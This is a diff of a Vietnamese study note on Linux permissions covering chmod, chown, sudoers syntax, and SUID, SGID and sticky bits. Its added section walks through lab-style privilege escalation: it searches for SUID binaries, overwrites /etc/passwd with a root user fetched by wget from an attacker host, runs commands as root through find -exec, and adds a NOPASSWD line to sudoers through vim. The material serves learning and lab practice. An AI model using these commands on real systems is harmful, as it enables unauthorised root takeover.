@@ -291,19 +291,90 @@ drwxr-x--- 32 nam nam
 | `P`  | FIFO                      |
 | `s`  | Socket                    |
 
-#### 2.1.1 Quyền truy cập số - Numeric permissions 
+### 2.2 `Chmod`, `chown` command
+- `chmod`: Thay đổi quyền cho file và folder (change permission for file/ folder)
+- `chown`: Thay đổi chủ sở hữu cho file và folder (change file/folder owner and group)
 
-| Symbolic | Octal |
-|----------|-------|
-| `rwx`    | 7     |
-| `rw-`    | 6     |
-| `r-x`    | 5     |
-| `r--`    | 4     |
-| `-wx`    | 3     |
-| `-w-`    | 2     |
-| `--x`    | 1     |
-| `---`    | 0     |
+```
+# chmod <option> <perm> <file/folder>
+# option:
+# -R : for folder only, to apply perm for file/folder within folder
+#example
+sudo chmod u=rwx,g=rw,o=rw test.py
+sudo chmod o-w test.py
+----------------------------------------------------------------
+# chown <option> <user>:<group> <file/folder>
+chown user:group test.py
+chown user test.py
+chown :group test.py
+```
 
+### 2.3. `Sudo` command
+- `sudo`: cho phép người dùng không phải root hiện tại chạy lệnh với tư cách là người dùng root hoặc quyền của người dùng khác tùy thuộc vào cấu hình trong file sudoer.
+```
+nam@ubuntu:~$ sudo -l
+```
+
+- Sự khác nhau chinh của `sudo` và su: `sudo` có thể sử dụng lệnh thực thi với đặc quyền trong khi đăng nhập tài khoản thông thường, su chuyển đổi tài khoản và mọi lệnh sẽ được thực thi dưới sự cho phép của tài khoản người dùng đó cho đến khi thoát khỏi shell. Lệnh Sudo sẽ ghi nhật ký trong khi su thì không.Config sudo (sudoer file - path: `/etc/sudoers` | `/etc/sudoers.d` )
+
+```
+nam@ubuntu:~$ sudo visudo
+```
+
+#### 2.3.1 Mô tả quyền hạn người dùng 
+```
+username ALL=(ALL:ALL) ALL
+
+#username: username which need to config permission.
+
+#ALL= : apply rule to ALL hosts and users.
+
+#(ALL:ALL) : allow user to run command as ALL users : allow user to run command as ALL group.
+
+#ALL : allow user to run all command. - define cmd user may run
+```
+
+#### 2.3.2 Mô tả quyền hạn nhóm
+```
+
+
+%groupname ALL=(ALL:ALL) ALL 
+
+# Members of the admin group may gain root privileges
+
+%admin ALL=(ALL) ALL 
+
+# Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL
+```
+### 2.4. Quyền truy cập file và leo thang đặc quyền trong Linux 
+#### 2.4.1. Quyền truy cập file 
+![](./images/file-permission.webp)
+
+- Quyền truy cập cho file vào folder được đại diện bởi 10 ký tự. Trong đó thì ký tự đầu tiên giúp xác định định dạng của file ví dụ như `-` đại diện cho file và `d` đại diện cho 1 thư mục.
+Còn mỗi nhóm 3 ký tự trong 9 ký tự còn lại lần lượt đại diện cho quyền của chủ sở hữu, các nhóm và các người dùng khác .
+- Quyền với file/thư mục được xác định bởi 3 loại quyền là 
+    - r - read : Quyền đọc với con số biểu đạt là 4 
+    - w - write : Quyền chỉnh sửa với con số biểu đạt là 2 
+    - x - excute : Quyền thực thi với con số biểu đạt là 1
+- Các tổ hợp nhóm quyền thường gặp :
+
+| Ký tự | Tổng số đại diện cho quyền | Quyền hạn |
+|----------|-------|----------|
+| `rwx`    | 7     | Quyền đọc,ghi và thực thi |
+| `rw-`    | 6     | Quyền đọc,ghi |
+| `r-x`    | 5     | Quyền đọc và thực thi |
+| `r--`    | 4     | Quyền đọc |
+| `-wx`    | 3     | Quyền ghi và thực thi |
+| `-w-`    | 2     | Quyền ghi  |
+| `--x`    | 1     | Quyền thực thi |
+| `---`    | 0     | Không có quyền hạn | 
+
+> Để biết được file/folder đang được phân quyền như thế nào thì ta sử dụng lệnh `ls -la`
+
+![](./images/list-permissions.webp)
+
+#### 2.4.2. SUID, SGID và sticky bits
+- Ngoài 3 quyền với 3 nhóm người dùng khác nhau như ở trên thì còn có 3 special permisson với file/folder , đó là  SUID, SGID và sticky bits. 
 - Special Permission
     - `suid`: cho phép người dùng không phải chủ sở hữu của file thực thi file dưới quyền của chủ sở hữu (allow users who are not the owner of the file to execute it under the permission of the owner (ex: `passwd`, … ))
     ```bash
@@ -330,63 +401,167 @@ drwxr-x--- 32 nam nam
     sudo chmod 7760 test.py
     ```
 
-#### 2.1.2 `Chmod`, `chown` command
-- `chmod`: Thay đổi quyền cho file và folder (change permission for file/ folder)
-- `chown`: Thay đổi chủ sở hữu cho file và folder (change file/folder owner and group)
+##### 2.4.2.1. SUID
+- **SUID** ( hay **Set user ID** ) , thường được sử dụng trên các file thực thi ( **executable files** ). Quyền này cho phép file được thực thi với các đặc quyền (privileges) của chủ sở hữu file đó.
+**Ví dụ:** nếu một file được sở hữu bởi user root và được set SUID bit, thì bất kể ai thực thi file, nó sẽ luôn chạy với các đặc quyền của user **root**. Và khi xem permissions của file, ở phần User, nhãn **x** sẽ được chuyển sang nhãn **s**.
 
+![](./images/suid-1.webp)
+
+- Để gán SUID cho 1 file, có 2 cách:
+    - `chmod u+s [tên file]`
+    - `chmod 4555 [ tên file]` ( thêm 4 vào trước permissons )
+
+> Lưu ý: Nếu file chưa có quyền thực thi (executing file as program), SUID sẽ là chữ S. Để nhãn S trở thành s bạn phải cấp quyền thực thi cho file, cũng có 2 cách:
+
+##### 2.4.2.2. SGID
+- **SGID** ( hay **Set group ID** ) , cũng tương tự như SUID. Quyền này cho phép file được thực thi với các đặc quyền (privileges) của group sở hữu file đó. Ví dụ: nếu một file thuộc sở hữu của **Staff** group, bất kể ai thực thi file đó, nó sẽ luôn chạy với đặc quyền của **Staff** group.
+Và khi xem permissions của file, ở phần **Group**, nhãn **x** sẽ được chuyển sang nhãn **s**.
+
+![](./images/sgid-1.webp)
+
+- Để gán SGID cho 1 file, có 2 cách:
+    - `chmod g+s [tên file]`
+    - `chmod 2555 [ tên file]` ( thêm 2 vào trước permissons )
+
+- Ngoài ra **SGID** có thể được gán cho thư mục. Với cách gán tương tự như gán cho một file. Khi **SGID** được gán cho 1 thư mục, tất cả các file được tạo ra trong thư mục đó sẽ kế thừa quyền sở hữu của **Group** đối với thư mục đó.
+
+##### 2.4.2.3. Sticky Bit
+- Được dùng cho các thư mục chia sẻ , mục đích là ngăn chặn việc người dùng này xóa file của người dùng kia . Chỉ duy nhất owner và root mới có quyền rename hay xóa các file, thư mục khi nó được set **Sticky Bit**. Đó là lý do nó còn được gọi là **restricted deletion bit**.
+- Điều này khá hữu ích trên các thư mục được set quyền 777 (mọi người đều được phép đọc và ghi / xóa).
+
+![](./images/sticky-bit.webp)
+
+- Khác một chút với 2 permission phía trên, ở Sticky Bit, nhãn x sẽ được chuyển thành nhãn t.
+- Để gán Sticky Bit có 3 cách:
+    - `chmod +t [tên file, thư mục]`
+    - `chmod o+t [tên file, thư mục]`
+    - `chmod 1555 [ tên file,thư mục]` ( thêm 1 vào trước permissons )
+#### 2.4.3. Tìm Files có SUID
+- Command: `find / -perm -u=s -type f 2>/dev/null`
+- Trong đó:
+    - `/`: Tìm kiếm bắt đầu từ thư mục gốc (root) của hệ thống, việc này giúp quét toàn bộ files trong tất cả thư mục. Điều này giúp tăng phạm vi tìm kiếm.
+    - `-perm`: Tìm kiếm theo các quyền được chỉ định sau đây.
+    - `-u=s`: Tìm kiếm các file được sở hữu bởi người dùng root. Sử dụng -user [tên user] để tìm kiếm các files của user đó.
+    - `-type`: chỉ định loại file tìm kiếm.
+    - `f`: Chỉ định loại file cần tìm là các **regular file**, mà không là các thư mục hoặc các file đặc biệt. Hầu hết các file được sử dụng trực tiếp bởi người dùng là các regular file. Ví dụ: file thực thi, file văn bản, file hình ảnh... Điều này giúp tăng hiệu quả tìm kiếm.
+    - `2>`: có nghĩa là redirect (kí hiệu là >) **file channel** số 2 tới nơi được chỉ định, **file channel** này ánh xạ tới stderr (**standard error file channel**), là nơi các chương trình thường ghi lỗi vào.
+    - `/dev/null`: Đây là nơi được redirect đến, nó là một **pseudo-device** (thiết bị giả) hay một **special character device** mà nó cho phép write (ghi) bất cứ thứ gì lên nó, nhưng khi yêu cầu đọc nó, nó không return bất cứ thứ gì.
+=> Vậy câu lệnh trên sẽ tìm toàn bộ files có SUID của user root. Việc thêm 2>/dev/null ý nghĩa rằng toàn bộ errors (**file channel 2**) trong quá trình chạy sẽ được redirect tới **/dev/null** nhằm bỏ qua tất cả errors đó.
+
+![](./images/suid-2.webp)
+
+#### 2.4.4. Privilege Escalation using SUID
+- Thông thường trong các bài lab sử dụng method này, các SUID sẽ được gán cho các file/program/command với Owner có quyền cao hơn quyền của User khi chúng ta thâm nhập thành công vào bên trong. Nếu đó là Root, xin chúc mừng, game có vẻ dễ. Nhưng nếu là User khác, thì cũng xin chúc mừng, vì có vẻ bạn đang chơi game đúng hướng.
+
+
+- Nếu bài lab có sử dụng method này để leo thang đặc quyền, khả năng cao sẽ là một trong số những trường hợp dưới đây, vì hiện tại đều đang khả dụng !
+
+##### 2.4.4.1. Khi SUID được gán cho Copy command
+Sau khi RCE thành công, sử dụng câu lệnh tìm kiếm quen thuộc: find / -perm -u=s -type f 2>/dev/null
+Command này dù là user vừa mới được tạo mới tinh cũng có thể thực thi
+
+![](./images/privilege-escalation-1.webp)
+
+Xác nhận lại 
 ```
-# chmod <option> <perm> <file/folder>
-# option:
-# -R : for folder only, to apply perm for file/folder within folder
-#example
-sudo chmod u=rwx,g=rw,o=rw test.py
-sudo chmod o-w test.py
-----------------------------------------------------------------
-# chown <option> <user>:<group> <file/folder>
-chown user:group test.py
-chown user test.py
-chown :group test.py
+which cp
+ls -ls /bin/cp
 ```
 
-### 2.2. `Sudo` command
-- `sudo`: cho phép người dùng không phải root hiện tại chạy lệnh với tư cách là người dùng root hoặc quyền của người dùng khác tùy thuộc vào cấu hình trong file sudoer.
+![](./images/privilege-escalation-2.webp)
+
+Ok nó có SUID, ý tưởng ở đây là: Chúng ta sẽ copy file /etc/passwd. Nơi chứa rất nhiều thông tin nhạy cảm như thông tin của các user trên máy. Sử dụng copy, chúng ta sẽ chuyển nó đến thư mục web /var/www/html. Trên máy attacker, chúng ta dễ dàng truy cập, copy toàn bộ nội dung vào 1 file text. Tạo một user mới bằng cách sử dụng OpenSSL, gán quyền root cho user đó ( UID = 0 ), lưu vào cuối file text. Sau đó chuyển lại về máy victim ở thư mục /tmp/ (thư mục mặc định, có toàn quyền để tạo hay xóa mọi file) . Cuối cùng là dùng copy để ghi đè lên file passwd thật.
+
+- Command: `cp /etc/passwd /var/www/html`
+
+
+![](./images/privilege-escalation-3.webp)
+
+Copy nội vào file text tên `passwd` và tạo một user mới:
+- Command: `openssl passwd -1 -salt [salt value] {password}`
+
+![](./images/privilege-escalation-4.webp)
+
+- Thêm user vào cuối file text trên, gán UID, GID:
+
+![](./images/privilege-escalation-5.webp)
+
+Đưa file text vừa tạo ở máy attacker lên 1 "web server" sử dụng python2:
+
+- Command:` python -m SimpleHTTPServer 8899`
+
+Tại thư mục **/tmp/** ở máy victim, **wget** file text trên về:
+Command:
 ```
-nam@ubuntu:~$ sudo -l
-```
-
-- Sự khác nhau chinh của `sudo` và su: `sudo` có thể sử dụng lệnh thực thi với đặc quyền trong khi đăng nhập tài khoản thông thường, su chuyển đổi tài khoản và mọi lệnh sẽ được thực thi dưới sự cho phép của tài khoản người dùng đó cho đến khi thoát khỏi shell. Lệnh Sudo sẽ ghi nhật ký trong khi su thì không.Config sudo (sudoer file - path: `/etc/sudoers` | `/etc/sudoers.d` )
-
-```
-nam@ubuntu:~$ sudo visudo
-```
-
-#### 2.2.1 Mô tả quyền hạn người dùng 
-```
-username ALL=(ALL:ALL) ALL
-
-#username: username which need to config permission.
-
-#ALL= : apply rule to ALL hosts and users.
-
-#(ALL:ALL) : allow user to run command as ALL users : allow user to run command as ALL group.
-
-#ALL : allow user to run all command. - define cmd user may run
-```
-
-#### 2.2.2 Mô tả quyền hạn nhóm
-```
-
-
-%groupname ALL=(ALL:ALL) ALL 
-
-# Members of the admin group may gain root privileges
-
-%admin ALL=(ALL) ALL 
-
-# Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL
+cd /tmp
+wget IP:8899/passwd
+cp passwd /etc/passwd
 ```
 
-### 2.3. Quyền root cho User 
+![](./images/privilege-escalation-6.webp)
+
+
+Kiểm tra xem đã ghi đè thành công chưa bằng cách đọc 3 dòng cuối của **/etc/passwd**
+Command: `tail -n 3 /etc/passwd`
+
+- Đến đây thì chỉ cần su (switch user) sang user3 và Get ROOT.
+![](./images/privilege-escalation-7.webp)
+
+##### 2.4.4.2. Khi SUID được gán cho Find command
+Command: `find / -perm -u=s -type f 2>/dev/null`
+Tại đây ta grep find để trả ra kết quả dễ nhìn hơn.
+![](./images/privilege-escalation-8.webp)
+
+Với find, bạn không thể có được một Root shell, nhưng có thể thực thi mọi lệnh với tư cách root.
+
+
+- Command:
+```
+touch anything
+find anything -exec "command muốn thực thi" ;
+```
+
+![](./images/privilege-escalation-9.webp)
+
+
+#### 2.4.4.3. Khi SUID được gán cho Vim
+- Command: `find / -perm -u=s -type f 2>/dev/null| grep vim`
+
+![](./images/privilege-escalation-10.webp)
+
+Tại đây khi Vim được gán SUID, chúng ta sẽ dùng nó để sửa đổi file Sudoers.
+Command: `vim visudo`
+Edit :`username ALL=(ALL) NOPASSWD:ALL`
+
+![](./images/privilege-escalation-11.webp)
+
+Và get ROOT:
+
+![](./images/privilege-escalation-12.webp)
+
+##### 2.4.4.4. Khi SUID được gán những script có sẵn
+- Chuyện này có lẽ thường chỉ có trong những bài Lab ở mức độ easy, nơi owner tạo ra những đoạn script có sẵn dùng để get root shell. Cũng là một lưu ý khi gặp bài kiểu này, hãy thêm | grep shell hay | grep root, grep |asroot ...Nếu có, việc còn lại chỉ là chỉ là chạy script.
+
+![](./images/privilege-escalation-13.webp)
+
+##### 2.4.4.5. Khi SUID được gán cho Nano
+- Phương thức cũng sẽ giống như ở phần copy, mục tiêu là chỉnh sửa file /etc/passwd. Nhưng với nano, mọi chuyện dễ dàng hơn nhiều.
+- Tạo user mới bằng openSSL như phía trên: openssl passwd -1 -salt demo passwd123
+
+![](./images/privilege-escalation-14.webp)
+
+- Kiểm tra xem nano có được gán SUID không, nếu có thì thêm user vào /etc/passwd với đặc quyền root.
+Command:
+`find / -perm -u=s -type f 2>/dev/null | grep nano`
+`nano /etc/passwd`
+
+![](./images/privilege-escalation-15.webp)
+
+
+Và get ROOT:
+![](./images/privilege-escalation-16.webp)
+
+### 2.5. Quyền root cho User 
 File `/etc/sudoers` : 
 - Cấu trúc : `%GROUP HOSTNAME=(TARGET_USERS) COMMAND`
 
